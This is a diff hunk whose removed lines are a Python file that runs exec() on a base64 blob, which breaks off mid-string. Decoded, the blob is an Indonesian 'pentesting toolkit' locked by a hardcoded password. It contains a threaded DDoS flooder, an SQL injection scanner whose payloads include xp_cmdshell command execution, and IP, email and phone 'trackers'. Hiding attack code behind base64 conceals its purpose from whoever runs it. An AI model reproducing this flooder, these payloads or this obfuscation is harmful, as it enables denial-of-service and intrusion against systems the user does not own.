@@ -1,3 +1,477 @@
-# Encrypted Python Code
-import base64
-exec(base64.b64decode("IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLQoiIiIKWmV0elQwMGx6IFYyIC0gQWR2YW5jZWQgUGVudGVzdGluZyBUb29sa2l0CkNyZWF0ZWQgYnk6IERlZW1aZXQKVmVyc2lvbjogMi4wCiIiIgoKaW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHNvY2tldAppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGpzb24KaW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCByZQppbXBvcnQgaGFzaGxpYgppbXBvcnQgdXJsbGliLnBhcnNlCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCmZyb20gY29sb3JhbWEgaW1wb3J0IGluaXQsIEZvcmUsIFN0eWxlCgojIEluaXRpYWxpemUgY29sb3JhbWEKaW5pdChhdXRvcmVzZXQ9VHJ1ZSkKCiMgUGFzc3dvcmQgdW50dWsgYWtzZXMKQUNDRVNTX1BBU1NXT1JEID0gIkRpbXpHYW50ZW5nIgoKIyBBU0NJSSBBcnQgZGVuZ2FuIHdhcm5hCkFTQ0lJX0FSVCA9IGYiIiIKe0ZvcmUuQ1lBTn0gX19fX18gICAgXyAgICAgICAgIF9fX19fICAgICAgICAgICBfICAgICAgX18gICAgIF9fX19fXyAgCntGb3JlLkNZQU59fF9fICAvX19ffCB8XyBfX19fIHxfICAgX3xfXyAgIF9fXyB8IHxfX19fIFxcIFxcICAgLyAvX19fIFxcIAp7Rm9yZS5DWUFOfSAgLyAvLyBfIFxcIF9ffF8gIC8gICB8IHwvIF8gXFwgLyBfIFxcfCB8XyAgLyAgXFwgXFwgLyAvICBfXykgfAp7Rm9yZS5DWUFOfSAvIC98ICBfXy8gfF8gLyAvICAgIHwgfCAoXykgfCAoXykgfCB8LyAvICAgIFxcIFYgLyAgLyBfXy8gCntGb3JlLkNZQU59L19fX19cXF9fX3xcXF9fL19fX3wgICB8X3xcXF9fXy8gXFxfX18vfF8vX19ffCAgICBcXF8vICB8X19fX198CntGb3JlLllFTExPV30gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2Mi4wCiIiIgoKY2xhc3MgWmV0elQwMGx6VjI6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5ydW5uaW5nID0gVHJ1ZQogICAgICAgIHNlbGYuc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQogICAgICAgIHNlbGYudXNlcl9hZ2VudHMgPSBbCiAgICAgICAgICAgICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYnLAogICAgICAgICAgICAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwKSBBcHBsZVdlYktpdC81MzcuMzYnLAogICAgICAgICAgICAnTW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyAxNF8wIGxpa2UgTWFjIE9TIFgpIEFwcGxlV2ViS2l0LzYwNS4xLjE1JwogICAgICAgIF0KICAgICAgICBzZWxmLmdldF9zeXN0ZW1faW5mbygpCiAgICAgICAgCiAgICBkZWYgZ2V0X3N5c3RlbV9pbmZvKHNlbGYpOgogICAgICAgICIiIk1lbmRhcGF0a2FuIGluZm9ybWFzaSBzaXN0ZW0gdXNlciIiIgogICAgICAgIHRyeToKICAgICAgICAgICAgIyBJUCBQdWJsaWMKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgc2VsZi5wdWJsaWNfaXAgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycpLnRleHQKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgc2VsZi5wdWJsaWNfaXAgPSAiVGlkYWsgdGVyZGV0ZWtzaSIKICAgICAgICAgICAgCiAgICAgICAgICAgICMgT1MgSW5mbwogICAgICAgICAgICBzZWxmLm9zX25hbWUgPSBvcy5uYW1lCiAgICAgICAgICAgIGlmIG9zLm5hbWUgPT0gJ3Bvc2l4JzoKICAgICAgICAgICAgICAgIHNlbGYub3NfZGV0YWlsID0gc3VicHJvY2Vzcy5nZXRvdXRwdXQoJ3VuYW1lIC1hJykKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHNlbGYub3NfZGV0YWlsID0gc3lzLnBsYXRmb3JtCiAgICAgICAgICAgIAogICAgICAgICAgICAjIERldmljZS9Vc2VybmFtZQogICAgICAgICAgICBzZWxmLnVzZXJuYW1lID0gb3MuZ2V0bG9naW4oKSBpZiBoYXNhdHRyKG9zLCAnZ2V0bG9naW4nKSBlbHNlIG9zLmVudmlyb24uZ2V0KCdVU0VSJywgJ1Vua25vd24nKQogICAgICAgICAgICAKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHNlbGYucHVibGljX2lwID0gIkVycm9yIgogICAgICAgICAgICBzZWxmLm9zX2RldGFpbCA9ICJVbmtub3duIgogICAgICAgICAgICBzZWxmLnVzZXJuYW1lID0gIlVua25vd24iCiAgICAKICAgIGRlZiBjbGVhcl9zY3JlZW4oc2VsZik6CiAgICAgICAgIiIiTWVtYmVyc2loa2FuIGxheWFyIiIiCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicgaWYgb3MubmFtZSA9PSAncG9zaXgnIGVsc2UgJ2NscycpCiAgICAKICAgIGRlZiBwcmludF9iYW5uZXIoc2VsZik6CiAgICAgICAgIiIiTWVuYW1waWxrYW4gYmFubmVyIiIiCiAgICAgICAgc2VsZi5jbGVhcl9zY3JlZW4oKQogICAgICAgIHByaW50KEFTQ0lJX0FSVCkKICAgICAgICBwcmludChmIntGb3JlLkdSRUVOfeKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVlyIpCiAgICAgICAgcHJpbnQoZiJ7Rm9yZS5HUkVFTn3ilZEgICAgICAgICAgICAgICBTWVNURU0gSU5GT1JNQVRJT04gICAgICAgICAgICAgICAgICAgICAgICAg4pWRIikKICAgICAgICBwcmludChmIntGb3JlLkdSRUVOfeKVoOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVoyIpCiAgICAgICAgcHJpbnQoZiJ7Rm9yZS5DWUFOfeKVkSBQdWJsaWMgSVAgICAgOiB7c2VsZi5wdWJsaWNfaXA6PDQzfSDilZEiKQogICAgICAgIHByaW50KGYie0ZvcmUuQ1lBTn3ilZEgT1MgICAgICAgICAgIDoge3NlbGYub3NfZGV0YWlsWzo0NV06PDQ1fSDilZEiKQogICAgICAgIHByaW50KGYie0ZvcmUuQ1lBTn3ilZEgVXNlciAgICAgICAgIDoge3NlbGYudXNlcm5hbWU6PDQzfSDilZEiKQogICAgICAgIHByaW50KGYie0ZvcmUuQ1lBTn3ilZEgVGltZSAgICAgICAgIDoge2RhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCclWS0lbS0lZCAlSDolTTolUycpOjw0M30g4pWRIikKICAgICAgICBwcmludChmIntGb3JlLkdSRUVOfeKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnSIpCiAgICAgICAgcHJpbnQoKQogICAgCiAgICBkZWYgbG9naW4oc2VsZik6CiAgICAgICAgIiIiTG9naW4gZGVuZ2FuIHBhc3N3b3JkIiIiCiAgICAgICAgc2VsZi5wcmludF9iYW5uZXIoKQogICAgICAgIHByaW50KGYie0ZvcmUuWUVMTE9XfVshXSBNYXN1a2thbiBwYXNzd29yZCB1bnR1ayBtZW5nYWtzZXMgWmV0elQwMGx6IFYyIikKICAgICAgICAKICAgICAgICBhdHRlbXB0cyA9IDMKICAgICAgICB3aGlsZSBhdHRlbXB0cyA+IDA6CiAgICAgICAgICAgIHBhc3N3b3JkID0gaW5wdXQoZiJ7Rm9yZS5XSElURX1bP10gUGFzc3dvcmQ6IHtGb3JlLlJFU0VUfSIpCiAgICAgICAgICAgIGlmIHBhc3N3b3JkID09IEFDQ0VTU19QQVNTV09SRDoKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuR1JFRU59W+Kck10gQWtzZXMgZGliZXJpa2FuISBNZW11YXQgdG9vbHMuLi4iKQogICAgICAgICAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGF0dGVtcHRzIC09IDEKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuUkVEfVvinJddIFBhc3N3b3JkIHNhbGFoISBTaXNhIHBlcmNvYmFhbjoge2F0dGVtcHRzfSIpCiAgICAgICAgCiAgICAgICAgcHJpbnQoZiJ7Rm9yZS5SRUR9WyFdIEFrc2VzIGRpdG9sYWshIFByb2dyYW0gZGloZW50aWthbi4iKQogICAgICAgIHJldHVybiBGYWxzZQogICAgCiAgICBkZWYgb3NpbnRfaXBfdHJhY2tlcihzZWxmLCBpcF9hZGRyZXNzKToKICAgICAgICAiIiJNZWxhY2FrIGluZm9ybWFzaSBJUCIiIgogICAgICAgIHByaW50KGYiXG57Rm9yZS5DWUFOfVsqXSBNZWxhY2FrIElQOiB7aXBfYWRkcmVzc30iKQogICAgICAgIAogICAgICAgIHRyeToKICAgICAgICAgICAgIyBNZW5nZ3VuYWthbiBpcGFwaS5jbwogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vaXBhcGkuY28ve2lwX2FkZHJlc3N9L2pzb24vJykKICAgICAgICAgICAgZGF0YSA9IHJlc3BvbnNlLmpzb24oKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgJ2Vycm9yJyBub3QgaW4gZGF0YToKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuR1JFRU594pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXIikKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuR1JFRU594pWRICAgICAgICAgICAgICAgICAgICBJUCBUUkFDS0VSIFJFU1VMVFMgICAgICAgICAgICAgICAgICAgIOKVkSIpCiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkdSRUVOfeKVoOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVoyIpCiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkNZQU594pWRIElQIEFkZHJlc3MgICAgOiB7ZGF0YS5nZXQoJ2lwJywgJ04vQScpOjw0M30g4pWRIikKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuQ1lBTn3ilZEgQ2l0eSAgICAgICAgICA6IHtkYXRhLmdldCgnY2l0eScsICdOL0EnKTo8NDN9IOKVkSIpCiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkNZQU594pWRIFJlZ2lvbiAgICAgICAgOiB7ZGF0YS5nZXQoJ3JlZ2lvbicsICdOL0EnKTo8NDN9IOKVkSIpCiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkNZQU594pWRIENvdW50cnkgICAgICAgOiB7ZGF0YS5nZXQoJ2NvdW50cnlfbmFtZScsICdOL0EnKTo8NDN9IOKVkSIpCiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkNZQU594pWRIElTUCAgICAgICAgICAgOiB7ZGF0YS5nZXQoJ29yZycsICdOL0EnKTo8NDN9IOKVkSIpCiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkNZQU594pWRIExhdGl0dWRlICAgICAgOiB7ZGF0YS5nZXQoJ2xhdGl0dWRlJywgJ04vQScpOjw0M30g4pWRIikKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuQ1lBTn3ilZEgTG9uZ2l0dWRlICAgICA6IHtkYXRhLmdldCgnbG9uZ2l0dWRlJywgJ04vQScpOjw0M30g4pWRIikKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuQ1lBTn3ilZEgVGltZXpvbmUgICAgICA6IHtkYXRhLmdldCgndGltZXpvbmUnLCAnTi9BJyk6PDQzfSDilZEiKQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5HUkVFTn3ilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0iKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAjIEdvb2dsZSBNYXBzIGxpbmsKICAgICAgICAgICAgICAgIGlmICdsYXRpdHVkZScgaW4gZGF0YSBhbmQgJ2xvbmdpdHVkZScgaW4gZGF0YToKICAgICAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLllFTExPV31bK10gR29vZ2xlIE1hcHM6IGh0dHBzOi8vbWFwcy5nb29nbGUuY29tLz9xPXtkYXRhWydsYXRpdHVkZSddfSx7ZGF0YVsnbG9uZ2l0dWRlJ119IikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuUkVEfVvinJddIElQIHRpZGFrIHZhbGlkIGF0YXUgdGlkYWsgZGl0ZW11a2FuIikKICAgICAgICAgICAgICAgIAogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5SRUR9W+Kcl10gRXJyb3I6IHtlfSIpCiAgICAKICAgIGRlZiBvc2ludF9lbWFpbF90cmFja2VyKHNlbGYsIGVtYWlsKToKICAgICAgICAiIiJNZWxhY2FrIGluZm9ybWFzaSBlbWFpbCIiIgogICAgICAgIHByaW50KGYiXG57Rm9yZS5DWUFOfVsqXSBNZWxhY2FrIEVtYWlsOiB7ZW1haWx9IikKICAgICAgICAKICAgICAgICAjIENlayBmb3JtYXQgZW1haWwKICAgICAgICBpZiBub3QgcmUubWF0Y2gociJbXkBdK0BbXkBdK1wuW15AXSsiLCBlbWFpbCk6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuUkVEfVvinJddIEZvcm1hdCBlbWFpbCB0aWRhayB2YWxpZCIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIAogICAgICAgIHByaW50KGYie0ZvcmUuWUVMTE9XfVshXSBNZW1lcmlrc2Ega2Vib2NvcmFuIGRhdGEuLi4iKQogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICAKICAgICAgICAjIFNpbXVsYXNpIHBlbWVyaWtzYWFuIChkYWxhbSByZWFsIGltcGxlbWVudGF0aW9uIGJpc2EgaW50ZWdyYXRlIGRlbmdhbiBBUEkpCiAgICAgICAgcHJpbnQoZiJ7Rm9yZS5HUkVFTn1bK10gRW1haWwgdmFsaWQ6IHtlbWFpbH0iKQogICAgICAgIHByaW50KGYie0ZvcmUuWUVMTE9XfVshXSBUaXBzOiBHdW5ha2FuIGhhdmVpYmVlbnB3bmVkLmNvbSB1bnR1ayBjZWsga2Vib2NvcmFuIGRhdGEiKQogICAgICAgIAogICAgICAgICMgRWtzdHJhayBkb21haW4gZW1haWwKICAgICAgICBkb21haW4gPSBlbWFpbC5zcGxpdCgnQCcpWzFdCiAgICAgICAgcHJpbnQoZiJ7Rm9yZS5DWUFOfVsqXSBEb21haW4gZW1haWw6IHtkb21haW59IikKICAgICAgICBwcmludChmIntGb3JlLllFTExPV31bIV0gTGFrdWthbiBXSE9JUyBsb29rdXAgdW50dWsgZG9tYWluIHRlcnNlYnV0IikKICAgIAogICAgZGVmIG9zaW50X3Bob25lX3RyYWNrZXIoc2VsZiwgcGhvbmUpOgogICAgICAgICIiIk1lbGFjYWsgaW5mb3JtYXNpIG5vbW9yIHRlbGVwb24iIiIKICAgICAgICBwcmludChmIlxue0ZvcmUuQ1lBTn1bKl0gTWVsYWNhayBOb21vcjoge3Bob25lfSIpCiAgICAgICAgCiAgICAgICAgIyBIYXB1cyBrYXJha3RlciBub24tZGlnaXQKICAgICAgICBjbGVhbl9waG9uZSA9IHJlLnN1YihyJ1xEJywgJycsIHBob25lKQogICAgICAgIAogICAgICAgIGlmIGxlbihjbGVhbl9waG9uZSkgPCA4OgogICAgICAgICAgICBwcmludChmIntGb3JlLlJFRH1b4pyXXSBOb21vciB0ZWxlcG9uIHRlcmxhbHUgcGVuZGVrIikKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgCiAgICAgICAgcHJpbnQoZiJ7Rm9yZS5ZRUxMT1d9WyFdIE1lbmdhbmFsaXNpcyBmb3JtYXQgbm9tb3IuLi4iKQogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICAKICAgICAgICAjIERldGVrc2kga29kZSBuZWdhcmEgKHNlZGVyaGFuYSkKICAgICAgICBpZiBjbGVhbl9waG9uZS5zdGFydHN3aXRoKCc2MicpOgogICAgICAgICAgICBjb3VudHJ5ID0gIkluZG9uZXNpYSIKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5HUkVFTn1bK10gS29kZSBuZWdhcmEgdGVyZGV0ZWtzaTogSW5kb25lc2lhICgrNjIpIikKICAgICAgICBlbGlmIGNsZWFuX3Bob25lLnN0YXJ0c3dpdGgoJzEnKToKICAgICAgICAgICAgY291bnRyeSA9ICJVU0EvQ2FuYWRhIgogICAgICAgICAgICBwcmludChmIntGb3JlLkdSRUVOfVsrXSBLb2RlIG5lZ2FyYSB0ZXJkZXRla3NpOiBVU0EvQ2FuYWRhICgrMSkiKQogICAgICAgIGVsaWYgY2xlYW5fcGhvbmUuc3RhcnRzd2l0aCgnNDQnKToKICAgICAgICAgICAgY291bnRyeSA9ICJVSyIKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5HUkVFTn1bK10gS29kZSBuZWdhcmEgdGVyZGV0ZWtzaTogVUsgKCs0NCkiKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGNvdW50cnkgPSAiVW5rbm93biIKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5ZRUxMT1d9WyFdIEtvZGUgbmVnYXJhIHRpZGFrIGRpa2VuYWxpIikKICAgICAgICAKICAgICAgICBwcmludChmIntGb3JlLllFTExPV31bIV0gQ2F0YXRhbjogUGVsYWNha2FuIGxlbmdrYXAgbWVtYnV0dWhrYW4gQVBJIGJlcmJheWFyIikKICAgIAogICAgZGVmIGRkb3NfYXR0YWNrKHNlbGYsIHRhcmdldCwgcG9ydD04MCwgdGhyZWFkcz0xMDAsIGR1cmF0aW9uPTMwKToKICAgICAgICAiIiJNZWxha3VrYW4gRERvUyBhdHRhY2sgKEVEVUNBVElPTkFMIFBVUlBPU0UgT05MWSkiIiIKICAgICAgICBwcmludChmIlxue0ZvcmUuUkVEfVshXSBQRVJJTkdBVEFOOiBERG9TIElMTEVHQUwgdGFucGEgaXppbiEiKQogICAgICAgIHByaW50KGYie0ZvcmUuWUVMTE9XfVshXSBJbmkgaGFueWEgdW50dWsgZWR1a2FzaSBkYW4gdGVzdGluZyBzaXN0ZW0gc2VuZGlyaSIpCiAgICAgICAgCiAgICAgICAgY29uZmlybSA9IGlucHV0KGYie0ZvcmUuV0hJVEV9Wz9dIExhbmp1dGthbj8gKHkvbik6IHtGb3JlLlJFU0VUfSIpLmxvd2VyKCkKICAgICAgICBpZiBjb25maXJtICE9ICd5JzoKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgCiAgICAgICAgcHJpbnQoZiJcbntGb3JlLkNZQU59WypdIE1lbXVsYWkgRERvUyBhdHRhY2sga2Uge3RhcmdldH06e3BvcnR9IikKICAgICAgICBwcmludChmIntGb3JlLkNZQU59WypdIFRocmVhZHM6IHt0aHJlYWRzfSwgRHVyYXNpOiB7ZHVyYXRpb259IGRldGlrIikKICAgICAgICAKICAgICAgICBhdHRhY2tfY291bnQgPSAwCiAgICAgICAgc3RvcF9hdHRhY2sgPSBGYWxzZQogICAgICAgIAogICAgICAgIGRlZiBhdHRhY2tfdGhyZWFkKCk6CiAgICAgICAgICAgIG5vbmxvY2FsIGF0dGFja19jb3VudAogICAgICAgICAgICB3aGlsZSBub3Qgc3RvcF9hdHRhY2s6CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgIyBNZW1idWF0IHNvY2tldCBjb25uZWN0aW9uCiAgICAgICAgICAgICAgICAgICAgc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKICAgICAgICAgICAgICAgICAgICBzb2NrLnNldHRpbWVvdXQoMSkKICAgICAgICAgICAgICAgICAgICBzb2NrLmNvbm5lY3QoKHRhcmdldCwgcG9ydCkpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgIyBNZW5naXJpbSBwYWNrZXQKICAgICAgICAgICAgICAgICAgICBzb2NrLnNlbmR0bygoIkdFVCAvIEhUVFAvMS4xXHJcbiIpLmVuY29kZSgnYXNjaWknKSwgKHRhcmdldCwgcG9ydCkpCiAgICAgICAgICAgICAgICAgICAgc29jay5zZW5kdG8oKCJIb3N0OiAiICsgdGFyZ2V0ICsgIlxyXG5cclxuIikuZW5jb2RlKCdhc2NpaScpLCAodGFyZ2V0LCBwb3J0KSkKICAgICAgICAgICAgICAgICAgICBzb2NrLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBhdHRhY2tfY291bnQgKz0gMQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgCiAgICAgICAgIyBTdGFydCB0aHJlYWRzCiAgICAgICAgdGhyZWFkX2xpc3QgPSBbXQogICAgICAgIHN0YXJ0X3RpbWUgPSB0aW1lLnRpbWUoKQogICAgICAgIAogICAgICAgIGZvciBpIGluIHJhbmdlKHRocmVhZHMpOgogICAgICAgICAgICB0aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1hdHRhY2tfdGhyZWFkKQogICAgICAgICAgICB0aHJlYWQuZGFlbW9uID0gVHJ1ZQogICAgICAgICAgICB0aHJlYWQuc3RhcnQoKQogICAgICAgICAgICB0aHJlYWRfbGlzdC5hcHBlbmQodGhyZWFkKQogICAgICAgIAogICAgICAgIHByaW50KGYie0ZvcmUuWUVMTE9XfVshXSBBdHRhY2sgYmVyamFsYW4uLi4gVGVrYW4gQ3RybCtDIHVudHVrIGJlcmhlbnRpIikKICAgICAgICAKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdoaWxlIHRpbWUudGltZSgpIC0gc3RhcnRfdGltZSA8IGR1cmF0aW9uOgogICAgICAgICAgICAgICAgdGltZS5zbGVlcCgxKQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5DWUFOfVsqXSBQYWNrZXRzIHRlcmtpcmltOiB7YXR0YWNrX2NvdW50fSIsIGVuZD0nXHInKQogICAgICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICAgICAgcHJpbnQoZiJcbntGb3JlLllFTExPV31bIV0gQXR0YWNrIGRpaGVudGlrYW4gb2xlaCB1c2VyIikKICAgICAgICAKICAgICAgICBzdG9wX2F0dGFjayA9IFRydWUKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgCiAgICAgICAgcHJpbnQoZiJcbntGb3JlLkdSRUVOfVsrXSBBdHRhY2sgc2VsZXNhaSEiKQogICAgICAgIHByaW50KGYie0ZvcmUuR1JFRU59WytdIFRvdGFsIHBhY2tldHMgdGVya2lyaW06IHthdHRhY2tfY291bnR9IikKICAgIAogICAgZGVmIHNxbF9pbmplY3Rpb25fc2Nhbm5lcihzZWxmLCB1cmwpOgogICAgICAgICIiIlNjYW5uZXIgU1FMIEluamVjdGlvbiBzZWRlcmhhbmEiIiIKICAgICAgICBwcmludChmIlxue0ZvcmUuQ1lBTn1bKl0gU2Nhbm5pbmcgU1FMIEluamVjdGlvbjoge3VybH0iKQogICAgICAgIAogICAgICAgICMgRGFmdGFyIHBheWxvYWQgU1FMIEluamVjdGlvbgogICAgICAgIHBheWxvYWRzID0gWwogICAgICAgICAgICAiJyIsCiAgICAgICAgICAgICInIE9SICcxJz0nMSIsCiAgICAgICAgICAgICInIE9SICcxJz0nMScgLS0iLAogICAgICAgICAgICAiJyBVTklPTiBTRUxFQ1QgTlVMTC0tIiwKICAgICAgICAgICAgIicgQU5EIDE9Q09OVkVSVChpbnQsIEBAdmVyc2lvbiktLSIsCiAgICAgICAgICAgICInIEVYRUMgeHBfY21kc2hlbGwoJ2RpcicpLS0iCiAgICAgICAgXQogICAgICAgIAogICAgICAgIHZ1bG5lcmFibGUgPSBGYWxzZQogICAgICAgIAogICAgICAgIGZvciBwYXlsb2FkIGluIHBheWxvYWRzOgogICAgICAgICAgICB0ZXN0X3VybCA9IGYie3VybH17cGF5bG9hZH0iCiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuWUVMTE9XfVshXSBUZXN0aW5nOiB7cGF5bG9hZFs6MjBdfS4uLiIpCiAgICAgICAgICAgIAogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBoZWFkZXJzID0geydVc2VyLUFnZW50JzogcmFuZG9tLmNob2ljZShzZWxmLnVzZXJfYWdlbnRzKX0KICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHRlc3RfdXJsLCBoZWFkZXJzPWhlYWRlcnMsIHRpbWVvdXQ9NSkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgIyBEZXRla3NpIGVycm9yIFNRTAogICAgICAgICAgICAgICAgc3FsX2Vycm9ycyA9IFsKICAgICAgICAgICAgICAgICAgICAnc3FsIHN5bnRheCcsCiAgICAgICAgICAgICAgICAgICAgJ215c3FsX2ZldGNoJywKICAgICAgICAgICAgICAgICAgICAnbXlzcWxfbnVtX3Jvd3MnLAogICAgICAgICAgICAgICAgICAgICd5b3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIHNxbCcsCiAgICAgICAgICAgICAgICAgICAgJ3dhcm5pbmc6IG15c3FsJywKICAgICAgICAgICAgICAgICAgICAndW5jbG9zZWQgcXVvdGF0aW9uIG1hcmsnLAogICAgICAgICAgICAgICAgICAgICdzcWwgc2VydmVyJywKICAgICAgICAgICAgICAgICAgICAnb2RiYyBkcml2ZXInLAogICAgICAgICAgICAgICAgICAgICdwb3N0Z3Jlc3FsJwogICAgICAgICAgICAgICAgXQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBmb3IgZXJyb3IgaW4gc3FsX2Vycm9yczoKICAgICAgICAgICAgICAgICAgICBpZiBlcnJvciBpbiByZXNwb25zZS50ZXh0Lmxvd2VyKCk6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuR1JFRU59WytdIFZVTE5FUkFCTEUhIFBheWxvYWQ6IHtwYXlsb2FkfSIpCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuR1JFRU59WytdIEVycm9yIGRpdGVtdWthbjoge2Vycm9yfSIpCiAgICAgICAgICAgICAgICAgICAgICAgIHZ1bG5lcmFibGUgP